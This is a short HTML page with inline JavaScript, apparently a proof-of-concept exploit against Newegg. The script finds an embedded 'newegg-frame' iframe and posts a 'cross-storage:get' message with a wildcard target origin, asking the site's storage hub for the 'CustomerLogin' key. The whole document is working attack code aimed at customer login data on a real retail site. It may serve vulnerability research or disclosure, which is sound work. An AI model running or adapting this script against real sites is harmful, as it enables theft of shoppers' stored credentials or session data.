<!DOCTYPE html>
<html>
  <body>
    <script>
      // wait until the parent finishes loading the target iframe
      setTimeout(() => {
        // reference to the Newegg iframe in the parent
        console.log("Starting attack");
        const targetFrame = window.parent.document.getElementById("newegg-frame");

        if (targetFrame && targetFrame.contentWindow) {
          // example request payload (fake get request for PoC)
          const payload = JSON.stringify({
            id: "1234567",
            action: "cross-storage:get",
            params: { key: "CustomerLogin" }
          });

          targetFrame.contentWindow.postMessage(payload, "*");
          console.log("Sent message to storageHub");
        }
      }, 2000); // wait a bit for iframe to load
    </script>
  </body>
</html>


